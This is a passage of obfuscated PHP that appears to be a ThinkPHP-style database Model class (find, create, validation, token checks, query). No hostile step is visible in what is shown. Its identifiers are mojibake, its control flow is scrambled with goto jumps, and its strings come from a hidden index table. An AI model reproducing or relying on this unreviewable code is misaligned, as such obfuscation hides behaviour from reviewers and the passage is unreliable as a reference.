if (!isset($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[273]])) { $BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[273]] = $this->getTableName(); $C≠–„Ñøï§ = $this->fields; } else { $C≠–„Ñøï§ = $this->getDbFields(); } if (!empty($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[274]])) { $BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[273]] .= $DÑ°‹üÍÁ¢[50] . $BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[274]]; } $BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[275]] = $this->name; goto D»ÏÚé£÷ÿ; aÍ»åâ©òË: } protected function _options_filter(&$e¿åéå®Ü°) { } protected function _parseType(&$Cè¶ë≤Ü°Ó, $FÜáœ∑«Çù) { $D‰∆•Øá‰¯ =& $_SERVER[Æ¡î¢≠¯™]; if (empty($this->options[$D‰∆•Øá‰¯[279]][$D‰∆•Øá‰¯[4] . $FÜáœ∑«Çù])) { $dÔäÈ‰—ãÂ = strtolower($this->fields[$D‰∆•Øá‰¯[246]][$FÜáœ∑«Çù]); if (!1 !== strpos($dÔäÈ‰—ãÂ, $D‰∆•Øá‰¯[280])) { } elseif (!1 === strpos($dÔäÈ‰—ãÂ, $D‰∆•Øá‰¯[281]) && !1 !== strpos($dÔäÈ‰—ãÂ, $D‰∆•Øá‰¯[282])) { $Cè¶ë≤Ü°Ó[$FÜáœ∑«Çù] = intval($Cè¶ë≤Ü°Ó[$FÜáœ∑«Çù]); } elseif (!1 !== strpos($dÔäÈ‰—ãÂ, $D‰∆•Øá‰¯[283]) || !1 !== strpos($dÔäÈ‰—ãÂ, $D‰∆•Øá‰¯[284])) { $Cè¶ë≤Ü°Ó[$FÜáœ∑«Çù] = floatval($Cè¶ë≤Ü°Ó[$FÜáœ∑«Çù]); } elseif (!1 !== strpos($dÔäÈ‰—ãÂ, $D‰∆•Øá‰¯[285])) { $Cè¶ë≤Ü°Ó[$FÜáœ∑«Çù] = (bool) $Cè¶ë≤Ü°Ó[$FÜáœ∑«Çù]; } } } public function find($c≤áÿ»Ê«ı = array()) { goto CÁçÍÓ“∆Ú; AË≤Ëı√¥◊: if (empty($DàÑˆ≥«ú∑)) { return null; } $this->data = $DàÑˆ≥«ú∑[0]; $this->_afterFind($this->data, $c≤áÿ»Ê«ı); goto fØâ≥ë¨õ¡; D∆‰îÒ¯¿à: $c≤áÿ»Ê«ı = $this->_parseOptions(); $DàÑˆ≥«ú∑ = $this->db->select($c≤áÿ»Ê«ı); if (!1 === $DàÑˆ≥«ú∑) { return !1; } goto AË≤Ëı√¥◊; CÁçÍÓ“∆Ú: $BÌø∆ÂË¨ï =& $_SERVER[Æ¡î¢≠¯™]; if (is_numeric($c≤áÿ»Ê«ı) || is_string($c≤áÿ»Ê«ı)) { $dçìê≠ÛñÉ[$this->getPk()] = intval($c≤áÿ»Ê«ı); $this->options[$BÌø∆ÂË¨ï[269]] = $dçìê≠ÛñÉ; } $this->options[$BÌø∆ÂË¨ï[286]] = 1; goto D∆‰îÒ¯¿à; fØâ≥ë¨õ¡: if (!empty($this->options[$BÌø∆ÂË¨ï[287]])) { return $this->returnResult($this->data, $this->options[$BÌø∆ÂË¨ï[287]]); } return $this->data; goto eºÇœÖ’å÷; eºÇœÖ’å÷: } protected function _afterFind(&$a·¨∆Ó÷È¬, $D¥Ë›…«≈Ω) { } protected function returnResult($a“óÜ∂ã¢Ï, $e®ƒ∆¨¥âá = '') { $E ÓçËüêä =& $_SERVER[Æ¡î¢≠¯™]; if ($e®ƒ∆¨¥âá) { if (is_callable($e®ƒ∆¨¥âá)) { return call_user_func($e®ƒ∆¨¥âá, $a“óÜ∂ã¢Ï); } switch (strtolower($e®ƒ∆¨¥âá)) { case $E ÓçËüêä[288]: return json_encode($a“óÜ∂ã¢Ï); case $E ÓçËüêä[289]: return xml_encode($a“óÜ∂ã¢Ï); } } return $a“óÜ∂ã¢Ï; } public function parseFieldsMap($fÿˆëÛ◊∑, $fôŸñ‰Ú¯∞ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $E‰›ÔÚ¨¬∏ => $cãÀ”ùä’«) { if ($fôŸñ‰Ú¯∞ == 1) { if (isset($fÿˆëÛ◊∑[$cãÀ”ùä’«])) { $fÿˆëÛ◊∑[$E‰›ÔÚ¨¬∏] = $fÿˆëÛ◊∑[$cãÀ”ùä’«]; unset($fÿˆëÛ◊∑[$cãÀ”ùä’«]); } } else { if (isset($fÿˆëÛ◊∑[$E‰›ÔÚ¨¬∏])) { $fÿˆëÛ◊∑[$cãÀ”ùä’«] = $fÿˆëÛ◊∑[$E‰›ÔÚ¨¬∏]; unset($fÿˆëÛ◊∑[$E‰›ÔÚ¨¬∏]); } } } } return $fÿˆëÛ◊∑; } public function setField($CºÉ•‹œ¨€, $aó∏ıÈ‰Ô∂ = '') { if (is_array($CºÉ•‹œ¨€)) { $Cçﬂ Àñûù = $CºÉ•‹œ¨€; } else { $Cçﬂ Àñûù[$CºÉ•‹œ¨€] = $aó∏ıÈ‰Ô∂; } return $this->save($Cçﬂ Àñûù); } public function setAdd($E∫®Ô∞°¡, $a∫ËÛ√πÁ¡ = 1) { $fƒçÈ≈Œì´ =& $_SERVER[Æ¡î¢≠¯™]; $Cøª›Òü’± = $E∫®Ô∞°¡ . $fƒçÈ≈Œì´[290] . $a∫ËÛ√πÁ¡; if ($a∫ËÛ√πÁ¡ < 0) { $Cøª›Òü’± = $E∫®Ô∞°¡ . $a∫ËÛ√πÁ¡; } return $this->setField($E∫®Ô∞°¡, array($fƒçÈ≈Œì´[291], $Cøª›Òü’±)); } public function getField($aºﬁ≥ºøóé, $eÚ€’§ŒÒß = null) { $E∆ÒÌé∫ú =& $_SERVER[Æ¡î¢≠¯™]; $D¡ÛÓÜ›£ı[$E∆ÒÌé∫ú[267]] = $aºﬁ≥ºøóé; $D¡ÛÓÜ›£ı = $this->_parseOptions($D¡ÛÓÜ›£ı); $aºﬁ≥ºøóé = trim($aºﬁ≥ºøóé); if (strpos($aºﬁ≥ºøóé, $E∆ÒÌé∫ú[47])) { if (!isset($D¡ÛÓÜ›£ı[$E∆ÒÌé∫ú[286]])) { $D¡ÛÓÜ›£ı[$E∆ÒÌé∫ú[286]] = is_numeric($eÚ€’§ŒÒß) ? $eÚ€’§ŒÒß : $E∆ÒÌé∫ú[33]; } $B◊‘¯¬⁄«≈ = $this->db->select($D¡ÛÓÜ›£ı); if (!empty($B◊‘¯¬⁄«≈)) { goto Cƒà‘ÿë†≠; d•ê≥¥ºÎÎ: $b⁄›ô‘ Êÿ = array_shift($aºﬁ≥ºøóé); $EÇáî§ö € = array(); $BﬁøÔ≥ßóÂ = count($d™”ÖéÍ¥™); goto açüÏÚá÷◊; Cƒà‘ÿë†≠: $d™”ÖéÍ¥™ = explode($E∆ÒÌé∫ú[47], $aºﬁ≥ºøóé); $aºﬁ≥ºøóé = array_keys($B◊‘¯¬⁄«≈[0]); $DøÃ£≠éîú = array_shift($aºﬁ≥ºøóé); goto d•ê≥¥ºÎÎ; açüÏÚá÷◊: foreach ($B◊‘¯¬⁄«≈ as $Dÿ∑‰èæ”‡) { $F€à†‹≈‰æ = $Dÿ∑‰èæ”‡[$DøÃ£≠éîú]; if (2 == $BﬁøÔ≥ßóÂ) { $EÇáî§ö €[$F€à†‹≈‰æ] = $Dÿ∑‰èæ”‡[$b⁄›ô‘ Êÿ]; } else { $EÇáî§ö €[$F€à†‹≈‰æ] = is_string($eÚ€’§ŒÒß) ? implode($eÚ€’§ŒÒß, $Dÿ∑‰èæ”‡) : $Dÿ∑‰èæ”‡; } } return $EÇáî§ö €; goto Cì·àê„Ω≈; Cì·àê„Ω≈: } } else { if (!0 !== $eÚ€’§ŒÒß) { $D¡ÛÓÜ›£ı[$E∆ÒÌé∫ú[286]] = is_numeric($eÚ€’§ŒÒß) ? $eÚ€’§ŒÒß : 1; } if ($eÚ€’§ŒÒß === $E∆ÒÌé∫ú[249]) { unset($D¡ÛÓÜ›£ı[$E∆ÒÌé∫ú[286]]); } $Dÿ∑‰èæ”‡ = $this->db->select($D¡ÛÓÜ›£ı); if (!empty($Dÿ∑‰èæ”‡)) { if ($eÚ€’§ŒÒß === $E∆ÒÌé∫ú[249]) { return reset($Dÿ∑‰èæ”‡[0]); } if (!0 !== $eÚ€’§ŒÒß && 1 == $D¡ÛÓÜ›£ı[$E∆ÒÌé∫ú[286]]) { return reset($Dÿ∑‰èæ”‡[0]); } foreach ($Dÿ∑‰èæ”‡ as $A…É†’±·ë) { $Cπ˜„˜¡ä˘[] = $A…É†’±·ë[$aºﬁ≥ºøóé]; } return $Cπ˜„˜¡ä˘; } } return null; } public function create($eâ¢±áí≠⁄ = '', $f£ÇπÜË≥ç = '') { goto C£¬¯‚ªÚï; f‘ÓÂ¢‰–é: $eâ¢±áí≠⁄ = $this->parseFieldsMap($eâ¢±áí≠⁄, 0); $f£ÇπÜË≥ç = $f£ÇπÜË≥ç ? $f£ÇπÜË≥ç : (!empty($eâ¢±áí≠⁄[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$FíÜˆ€ ¿‰[267]])) { $eæÑÑ–®‡ê = $this->options[$FíÜˆ€ ¿‰[267]]; unset($this->options[$FíÜˆ€ ¿‰[267]]); } elseif ($f£ÇπÜË≥ç == THINK_MODEL_INSERT && isset($this->insertFields)) { $eæÑÑ–®‡ê = $this->insertFields; } elseif ($f£ÇπÜË≥ç == THINK_MODEL_UPDATE && isset($this->updateFields)) { $eæÑÑ–®‡ê = $this->updateFields; } goto DÉó≤å¶êÓ; d–äáòí±: if ($this->autoCheckFields) { $eæÑÑ–®‡ê = $this->getDbFields(); foreach ($eâ¢±áí≠⁄ as $BÓ”±ÇééÉ => $bÉå÷óÑÜµ) { if (!in_array($BÓ”±ÇééÉ, $eæÑÑ–®‡ê)) { unset($eâ¢±áí≠⁄[$BÓ”±ÇééÉ]); } elseif (MAGIC_QUOTES_GPC && is_string($bÉå÷óÑÜµ)) { $eâ¢±áí≠⁄[$BÓ”±ÇééÉ] = stripslashes($bÉå÷óÑÜµ); } } } $this->autoOperation($eâ¢±áí≠⁄, $f£ÇπÜË≥ç); $this->data = $eâ¢±áí≠⁄; goto B‘·¡èøõ£; C£¬¯‚ªÚï: $FíÜˆ€ ¿‰ =& $_SERVER[Æ¡î¢≠¯™]; if (empty($eâ¢±áí≠⁄)) { $eâ¢±áí≠⁄ = $_POST; } elseif (is_object($eâ¢±áí≠⁄)) { $eâ¢±áí≠⁄ = get_object_vars($eâ¢±áí≠⁄); } if (empty($eâ¢±áí≠⁄) || !is_array($eâ¢±áí≠⁄)) { $this->error = think_lang($FíÜˆ€ ¿‰[265]); return !1; } goto f‘ÓÂ¢‰–é; B‘·¡èøõ£: return $eâ¢±áí≠⁄; goto c˜¶§Œ¯π›; DÉó≤å¶êÓ: if (isset($eæÑÑ–®‡ê)) { if (is_string($eæÑÑ–®‡ê)) { $eæÑÑ–®‡ê = explode($FíÜˆ€ ¿‰[47], $eæÑÑ–®‡ê); } if (think_config($FíÜˆ€ ¿‰[292])) { $eæÑÑ–®‡ê[] = think_config($FíÜˆ€ ¿‰[293]); } foreach ($eâ¢±áí≠⁄ as $BÓ”±ÇééÉ => $bÉå÷óÑÜµ) { if (!in_array($BÓ”±ÇééÉ, $eæÑÑ–®‡ê)) { unset($eâ¢±áí≠⁄[$BÓ”±ÇééÉ]); } } } if (!$this->autoValidation($eâ¢±áí≠⁄, $f£ÇπÜË≥ç)) { return !1; } if (!$this->autoCheckToken($eâ¢±áí≠⁄)) { $this->error = think_lang($FíÜˆ€ ¿‰[294]); return !1; } goto d–äáòí±; c˜¶§Œ¯π›: } public function autoCheckToken($A¶à≠ñüÈú) { $bì»‰ÇﬂÌ≤ =& $_SERVER[Æ¡î¢≠¯™]; if (isset($this->options[$bì»‰ÇﬂÌ≤[295]]) && !$this->options[$bì»‰ÇﬂÌ≤[295]]) { return !0; } if (think_config($bì»‰ÇﬂÌ≤[292])) { $cÓ÷ÓîÔÌò = think_config($bì»‰ÇﬂÌ≤[293]); if (!isset($A¶à≠ñüÈú[$cÓ÷ÓîÔÌò]) || Session::get($cÓ÷ÓîÔÌò)) { return !1; } list($E–ŸÇ¨ﬁÁ±, $dıÁ∞Çéå—) = explode($bì»‰ÇﬂÌ≤[80], $A¶à≠ñüÈú[$cÓ÷ÓîÔÌò]); if ($dıÁ∞Çéå— && Session::get($cÓ÷ÓîÔÌò . $bì»‰ÇﬂÌ≤[103] . $E–ŸÇ¨ﬁÁ±) === $dıÁ∞Çéå—) { Session::remove($cÓ÷ÓîÔÌò . $bì»‰ÇﬂÌ≤[103] . $E–ŸÇ¨ﬁÁ±); return !0; } if (think_config($bì»‰ÇﬂÌ≤[296])) { Session::remove($cÓ÷ÓîÔÌò . $bì»‰ÇﬂÌ≤[103] . $E–ŸÇ¨ﬁÁ±); } return !1; } return !0; } public function regex($Eªèåµêåÿ, $bˆî¶•ˆæ) { $A≠à€ÃÔ§Ø =& $_SERVER[Æ¡î¢≠¯™]; $E…¶áúÜáô = array($A≠à€ÃÔ§Ø[297] => $A≠à€ÃÔ§Ø[298], $A≠à€ÃÔ§Ø[299] => $A≠à€ÃÔ§Ø[300], $A≠à€ÃÔ§Ø[301] => $A≠à€ÃÔ§Ø[302], $A≠à€ÃÔ§Ø[303] => $A≠à€ÃÔ§Ø[304], $A≠à€ÃÔ§Ø[305] => $A≠à€ÃÔ§Ø[306], $A≠à€ÃÔ§Ø[307] => $A≠à€ÃÔ§Ø[308], $A≠à€ÃÔ§Ø[309] => $A≠à€ÃÔ§Ø[310], $A≠à€ÃÔ§Ø[284] => $A≠à€ÃÔ§Ø[311], $A≠à€ÃÔ§Ø[312] => $A≠à€ÃÔ§Ø[313]); if (isset($E…¶áúÜáô[strtolower($bˆî¶•ˆæ)])) { $bˆî¶•ˆæ = $E…¶áúÜáô[strtolower($bˆî¶•ˆæ)]; } return preg_match($bˆî¶•ˆæ, $Eªèåµêåÿ) === 1; } private function autoOperation(&$e∫ë◊äØÉÉ, $C»êÖ•É¯ä) { $dÉ“ÑÇö¢Ω =& $_SERVER[Æ¡î¢≠¯™]; if (!empty($this->options[$dÉ“ÑÇö¢Ω[314]])) { $EÑªà‹òÆé = $this->options[$dÉ“ÑÇö¢Ω[314]]; unset($this->options[$dÉ“ÑÇö¢Ω[314]]); } elseif (!empty($this->_auto)) { $EÑªà‹òÆé = $this->_auto; } if (isset($EÑªà‹òÆé)) { foreach ($EÑªà‹òÆé as $e—Ü©ˆ«¯Â) { if (empty($e—Ü©ˆ«¯Â[2])) { $e—Ü©ˆ«¯Â[2] = THINK_MODEL_INSERT; } if ($C»êÖ•É¯ä == $e—Ü©ˆ«¯Â[2] || $e—Ü©ˆ«¯Â[2] == THINK_MODEL_BOTH) { switch (trim($e—Ü©ˆ«¯Â[3])) { case $dÉ“ÑÇö¢Ω[315]: case $dÉ“ÑÇö¢Ω[316]: $dÑ±π˘ÁÌ™ = isset($e—Ü©ˆ«¯Â[4]) ? (array) $e—Ü©ˆ«¯Â[4] : array(); if (isset($e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]])) { array_unshift($dÑ±π˘ÁÌ™, $e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]]); } if ($dÉ“ÑÇö¢Ω[315] == $e—Ü©ˆ«¯Â[3]) { $e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]] = call_user_func_array($e—Ü©ˆ«¯Â[1], $dÑ±π˘ÁÌ™); } else { $e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]] = call_user_func_array(array(&$this, $e—Ü©ˆ«¯Â[1]), $dÑ±π˘ÁÌ™); } break; case $dÉ“ÑÇö¢Ω[267]: $e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]] = $e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[1]]; break; case $dÉ“ÑÇö¢Ω[317]: if ($dÉ“ÑÇö¢Ω[33] === $e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]]) { unset($e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]]); } break; case $dÉ“ÑÇö¢Ω[318]: default: $e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]] = $e—Ü©ˆ«¯Â[1]; } if (!1 === $e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]]) { unset($e∫ë◊äØÉÉ[$e—Ü©ˆ«¯Â[0]]); } } } } return $e∫ë◊äØÉÉ; } protected function autoValidation($BéÚäƒáõ‰, $CØ‹óÜ”¶≥) { $b®–ïÆ‚û• =& $_SERVER[Æ¡î¢≠¯™]; if (!empty($this->options[$b®–ïÆ‚û•[319]])) { $d—†úì¡µ• = $this->options[$b®–ïÆ‚û•[319]]; unset($this->options[$b®–ïÆ‚û•[319]]); } elseif (!empty($this->_validate)) { $d—†úì¡µ• = $this->_validate; } if (isset($d—†úì¡µ•)) { if ($this->patchValidate) { $this->error = array(); } foreach ($d—†úì¡µ• as $D”Ÿæà‘˘ => $BŒÊ•©Û≈Ÿ) { if (empty($BŒÊ•©Û≈Ÿ[5]) || $BŒÊ•©Û≈Ÿ[5] == THINK_MODEL_BOTH || $BŒÊ•©Û≈Ÿ[5] == $CØ‹óÜ”¶≥) { if (0 == strpos($BŒÊ•©Û≈Ÿ[2], $b®–ïÆ‚û•[320]) && strpos($BŒÊ•©Û≈Ÿ[2], $b®–ïÆ‚û•[321])) { $BŒÊ•©Û≈Ÿ[2] = think_lang(substr($BŒÊ•©Û≈Ÿ[2], 2, -1)); } $BŒÊ•©Û≈Ÿ[3] = isset($BŒÊ•©Û≈Ÿ[3]) ? $BŒÊ•©Û≈Ÿ[3] : THINK_EXISTS_VALIDATE; $BŒÊ•©Û≈Ÿ[4] = isset($BŒÊ•©Û≈Ÿ[4]) ? $BŒÊ•©Û≈Ÿ[4] : $b®–ïÆ‚û•[322]; switch ($BŒÊ•©Û≈Ÿ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($BéÚäƒáõ‰, $BŒÊ•©Û≈Ÿ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($b®–ïÆ‚û•[33] != trim($BéÚäƒáõ‰[$BŒÊ•©Û≈Ÿ[0]])) { if (!1 === $this->_validationField($BéÚäƒáõ‰, $BŒÊ•©Û≈Ÿ)) { return !1; } } break; default: if (isset($BéÚäƒáõ‰[$BŒÊ•©Û≈Ÿ[0]])) { if (!1 === $this->_validationField($BéÚäƒáõ‰, $BŒÊ•©Û≈Ÿ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Añ◊°ÏØ‹‚, $Dè⁄√¨ âÆ) { if (!1 === $this->_validationFieldItem($Añ◊°ÏØ‹‚, $Dè⁄√¨ âÆ)) { if ($this->patchValidate) { $this->error[$Dè⁄√¨ âÆ[0]] = $Dè⁄√¨ âÆ[2]; } else { $this->error = $Dè⁄√¨ âÆ[2]; return !1; } } return; } protected function _validationFieldItem($A…†∂¨äŒõ, $E£¥†˘æÌ¥) { $d§æı⁄‡·´ =& $_SERVER[Æ¡î¢≠¯™]; switch (strtolower(trim($E£¥†˘æÌ¥[4]))) { case $d§æı⁄‡·´[315]: case $d§æı⁄‡·´[316]: $D„ÛÚòôÖî = isset($E£¥†˘æÌ¥[6]) ? (array) $E£¥†˘æÌ¥[6] : array(); if (is_string($E£¥†˘æÌ¥[0]) && strpos($E£¥†˘æÌ¥[0], $d§æı⁄‡·´[47])) { $E£¥†˘æÌ¥[0] = explode($d§æı⁄‡·´[47], $E£¥†˘æÌ¥[0]); } if (is_array($E£¥†˘æÌ¥[0])) { foreach ($E£¥†˘æÌ¥[0] as $B¢ÏÖŸ⁄¥ä) { $D–äπﬁÇ∑µ[$B¢ÏÖŸ⁄¥ä] = $A…†∂¨äŒõ[$B¢ÏÖŸ⁄¥ä]; } array_unshift($D„ÛÚòôÖî, $D–äπﬁÇ∑µ); } else { array_unshift($D„ÛÚòôÖî, $A…†∂¨äŒõ[$E£¥†˘æÌ¥[0]]); } if ($d§æı⁄‡·´[315] == $E£¥†˘æÌ¥[4]) { return call_user_func_array($E£¥†˘æÌ¥[1], $D„ÛÚòôÖî); } else { return call_user_func_array(array(&$this, $E£¥†˘æÌ¥[1]), $D„ÛÚòôÖî); } case $d§æı⁄‡·´[323]: return $A…†∂¨äŒõ[$E£¥†˘æÌ¥[0]] == $A…†∂¨äŒõ[$E£¥†˘æÌ¥[1]]; case $d§æı⁄‡·´[324]: if (is_string($E£¥†˘æÌ¥[0]) && strpos($E£¥†˘æÌ¥[0], $d§æı⁄‡·´[47])) { $E£¥†˘æÌ¥[0] = explode($d§æı⁄‡·´[47], $E£¥†˘æÌ¥[0]); } $D˘ë±Œ◊êﬂ = array(); if (is_array($E£¥†˘æÌ¥[0])) { foreach ($E£¥†˘æÌ¥[0] as $B¢ÏÖŸ⁄¥ä) { $D˘ë±Œ◊êﬂ[$B¢ÏÖŸ⁄¥ä] = $A…†∂¨äŒõ[$B¢ÏÖŸ⁄¥ä]; } } else { $D˘ë±Œ◊êﬂ[$E£¥†˘æÌ¥[0]] = $A…†∂¨äŒõ[$E£¥†˘æÌ¥[0]]; } if (!empty($A…†∂¨äŒõ[$this->getPk()])) { $D˘ë±Œ◊êﬂ[$this->getPk()] = array($d§æı⁄‡·´[325], $A…†∂¨äŒõ[$this->getPk()]); } if ($this->where($D˘ë±Œ◊êﬂ)->find()) { return !1; } return !0; default: return $this->check($A…†∂¨äŒõ[$E£¥†˘æÌ¥[0]], $E£¥†˘æÌ¥[1], $E£¥†˘æÌ¥[4]); } } public function check($Aí£èïù´, $cö‰≤ÓÑæ–, $Cà¥®Ê¬ﬁØ = "\162\x65\x67\145\170") { $F¢ú≠˘œ·ç =& $_SERVER[Æ¡î¢≠¯™]; $Cà¥®Ê¬ﬁØ = strtolower(trim($Cà¥®Ê¬ﬁØ)); switch ($Cà¥®Ê¬ﬁØ) { case $F¢ú≠˘œ·ç[7]: case $F¢ú≠˘œ·ç[326]: $Eªø´◊Éﬂ£ = is_array($cö‰≤ÓÑæ–) ? $cö‰≤ÓÑæ– : explode($F¢ú≠˘œ·ç[47], $cö‰≤ÓÑæ–); return $Cà¥®Ê¬ﬁØ == $F¢ú≠˘œ·ç[7] ? in_array($Aí£èïù´, $Eªø´◊Éﬂ£) : !in_array($Aí£èïù´, $Eªø´◊Éﬂ£); case $F¢ú≠˘œ·ç[327]: case $F¢ú≠˘œ·ç[328]: if (is_array($cö‰≤ÓÑæ–)) { $fè®©É»õ¥ = $cö‰≤ÓÑæ–[0]; $F¡ÀªÊõïÿ = $cö‰≤ÓÑæ–[1]; } else { list($fè®©É»õ¥, $F¡ÀªÊõïÿ) = explode($F¢ú≠˘œ·ç[47], $cö‰≤ÓÑæ–); } return $Cà¥®Ê¬ﬁØ == $F¢ú≠˘œ·ç[327] ? $Aí£èïù´ >= $fè®©É»õ¥ && $Aí£èïù´ <= $F¡ÀªÊõïÿ : $Aí£èïù´ < $fè®©É»õ¥ || $Aí£èïù´ > $F¡ÀªÊõïÿ; case $F¢ú≠˘œ·ç[329]: case $F¢ú≠˘œ·ç[330]: return $Cà¥®Ê¬ﬁØ == $F¢ú≠˘œ·ç[329] ? $Aí£èïù´ == $cö‰≤ÓÑæ– : $Aí£èïù´ != $cö‰≤ÓÑæ–; case $F¢ú≠˘œ·ç[331]: $a◊ÚŒòß∆À = mb_strlen($Aí£èïù´, $F¢ú≠˘œ·ç[332]); if (strpos($cö‰≤ÓÑæ–, $F¢ú≠˘œ·ç[47])) { list($fè®©É»õ¥, $F¡ÀªÊõïÿ) = explode($F¢ú≠˘œ·ç[47], $cö‰≤ÓÑæ–); return $a◊ÚŒòß∆À >= $fè®©É»õ¥ && $a◊ÚŒòß∆À <= $F¡ÀªÊõïÿ; } else { return $a◊ÚŒòß∆À == $cö‰≤ÓÑæ–; } case $F¢ú≠˘œ·ç[333]: list($BÖÆˆ–‘É≈, $D ﬁéÜÕÈ§) = explode($F¢ú≠˘œ·ç[47], $cö‰≤ÓÑæ–); if (!is_numeric($BÖÆˆ–‘É≈)) { $BÖÆˆ–‘É≈ = strtotime($BÖÆˆ–‘É≈); } if (!is_numeric($D ﬁéÜÕÈ§)) { $D ﬁéÜÕÈ§ = strtotime($D ﬁéÜÕÈ§); } return NOW_TIME >= $BÖÆˆ–‘É≈ && NOW_TIME <= $D ﬁéÜÕÈ§; case $F¢ú≠˘œ·ç[334]: return in_array(get_client_ip(), explode($F¢ú≠˘œ·ç[47], $cö‰≤ÓÑæ–)); case $F¢ú≠˘œ·ç[335]: return !in_array(get_client_ip(), explode($F¢ú≠˘œ·ç[47], $cö‰≤ÓÑæ–)); case $F¢ú≠˘œ·ç[322]: default: return $this->regex($Aí£èïù´, $cö‰≤ÓÑæ–); } } public function query($a€„ÎóçÃå, $Fì»‘ÇïÌ® = false) { $a£ˆæ∏ëﬁ˜ =& $_SERVER[Æ¡î¢≠¯™]; if (!is_bool($Fì»‘ÇïÌ®) && !is_array($Fì»‘ÇïÌ®)) { $Fì»‘ÇïÌ® = func_get_args(); array_shift($Fì»‘ÇïÌ®); } $a€„ÎóçÃå = str_replace(array($a£ˆæ∏ëﬁ˜[62], $a£ˆæ∏ëﬁ˜[336]), $a£ˆæ∏ëﬁ˜[50], $a€„ÎóçÃå); $a€„ÎóçÃå = $this->parseSql($a€„ÎóçÃå, $Fì»‘ÇïÌ®); return $this->db->query($a€„ÎóçÃå); } public function execute($Bé±ﬂô±œ‚, $A≠±¯∏é‡≥ = false) { if (!is_bool($A≠±¯∏é‡≥) && !is_array($A≠±¯∏é‡≥)) { $A≠±¯∏é‡≥ = func_get_args(); array_shift($A≠±¯∏é‡≥); } $Bé±ﬂô±œ‚ = $this->parseSql($Bé±ﬂô±œ‚, $A≠±¯∏é‡≥); return $this->db->execute($Bé±ﬂô±œ‚); } protected function parseSql($AÇá¿ù∏Ûº, $b„¨´ãÍºç) { $bûâ•„Îˆ‰ =& $_SERVER[Æ¡î¢≠¯™]; if (!0 === $b„¨´ãÍºç) { $bï’ÚÙêË• = $this->_parseOptions(); $AÇá¿ù∏Ûº = $this->db->parseSql($AÇá¿ù∏Ûº, $bï’ÚÙêË•); } elseif (is_array($b„¨´ãÍºç)) { $b„¨´ãÍºç = array_map(array($this->db, $bûâ•„Îˆ‰[337]), $b„¨´ãÍºç); $AÇá¿ù∏Ûº = vsprintf($AÇá¿ù∏Ûº, $b„¨´ãÍºç); } else { $AÇá¿ù∏Ûº = strtr($AÇá¿ù∏Ûº, array($bûâ•„Îˆ‰[338] => $this->getTableName(), $bûâ•„Îˆ‰[339] => think_config($bûâ•„Îˆ‰[238]))); } $this->db->setModel($this->name); return $AÇá¿ù∏Ûº; } public function db($aÙò–µ≠ÃÎ = '', $AÂ∂Æ±«≈» = '', $fèµ‹∫ûﬁí = array()) { goto DÓúë°‹Ç™; E¬ú°·ñ¬¥: static $dÌÇˆ∂èâ» = array(); if (!isset($dÌÇˆ∂èâ»[$aÙò–µ≠ÃÎ]) || isset($dÌÇˆ∂èâ»[$aÙò–µ≠ÃÎ]) && $AÂ∂Æ±«≈» && $b∑äú„ üâ[$aÙò–µ≠ÃÎ] != $AÂ∂Æ±«≈») { if (!empty($AÂ∂Æ±«≈») && is_string($AÂ∂Æ±«≈») && !1 === strpos($AÂ∂Æ±«≈», $eàêÑµ⁄èç[8])) { $AÂ∂Æ±«≈» = think_config($AÂ∂Æ±«≈»); } $dÌÇˆ∂èâ»[$aÙò–µ≠ÃÎ] = Db::getInstance($AÂ∂Æ±«≈»); } elseif (NULL === $AÂ∂Æ±«≈») { $dÌÇˆ∂èâ»[$aÙò–µ≠ÃÎ]->close(); unset($dÌÇˆ∂èâ»[$aÙò–µ≠ÃÎ]); return; } if (!empty($fèµ‹∫ûﬁí)) { if (is_string($fèµ‹∫ûﬁí)) { parse_str($fèµ‹∫ûﬁí, $fèµ‹∫ûﬁí); } foreach ($fèµ‹∫ûﬁí as $f∂î£∞‚µ• => $B¢Ö«π≠ÏÒ) { $this->setProperty($f∂î£∞‚µ•, $B¢Ö«π≠ÏÒ); } } goto A∂ó ˆœ‰·; DÓúë°‹Ç™: $eàêÑµ⁄èç =& $_SERVER[Æ¡î¢≠¯™]; if ($eàêÑµ⁄èç[33] === $aÙò–µ≠ÃÎ && $this->db) { return $this->db; } static $b∑äú„ üâ = array(); goto E¬ú°·ñ¬¥; dÖ≤î÷üì¶: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f§…ª√ÚÆŸ; A∂ó ˆœ‰·: $b∑äú„ üâ[$aÙò–µ≠ÃÎ] = $AÂ∂Æ±«≈»; $this->db = $dÌÇˆ∂èâ»[$aÙò–µ≠ÃÎ]; $this->_after_db(); goto dÖ≤î÷üì¶; f§…ª√ÚÆŸ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $FΩîãƒüÍ· = get_class($this); if ($FΩîãƒüÍ· == $_SERVER[Æ¡î¢≠¯™][340]) { return $this->name; } $this->name = substr($FΩîãƒüÍ·, 0, -5); } return $this->name; } public function getTableName() { $fπ†≠ñó∏ò =& $_SERVER[Æ¡î¢≠¯™]; if (empty($this->trueTableName)) { $b´“≠ƒ´ËÉ = !empty($this->tablePrefix) ? $this->tablePrefix : $fπ†≠ñó∏ò[33]; if (!empty($this->tableName)) { $b´“≠ƒ´ËÉ .= $this->tableName; } else { $b´“≠ƒ´ËÉ .= think_parse_name($this->name); } $this->trueTableName = 